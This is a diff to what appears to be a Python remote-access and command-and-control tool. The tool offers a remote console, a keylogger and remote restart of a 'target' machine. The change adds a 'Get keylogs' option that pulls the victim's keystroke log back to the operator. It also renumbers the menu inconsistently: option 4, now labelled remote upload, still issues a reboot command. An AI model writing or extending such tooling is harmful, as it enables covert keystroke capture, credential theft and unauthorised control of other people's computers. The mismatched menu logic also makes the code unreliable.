@@ -40,9 +40,10 @@ options_menu = """
             [+] command and control:
                 [0] Remote Console
                 [1] Keylogger       
-                [2] remote download (not done yet) 
-                [3] remote upload   (not done yet) 
-                [4] restart target
+                [2] Get keylogs
+                [3] remote download (not done yet) 
+                [4] remote upload   (not done yet) 
+                [5] restart target
 
             [+] Options:
                 [-h] or [--help]     ---   help
@@ -153,6 +154,8 @@ def cli(arguments):
                     connect(tgt_ipv4,tgt_pword)
                 elif option == "1":
                     keylogger(tgt_ipv4,tgt_pword,tgt_td,tgt_sd)
+                elif option == "2":
+                    remote_download(tgt_ipv4,tgt_pword,f"{tgt_td}/{tgt_uname}.log",f"/home/{username}/Downloads/")
                 elif option == "4":
                     remote_command(tgt_ipv4,tgt_pword,"shutdown /r")
                 elif option == "help":
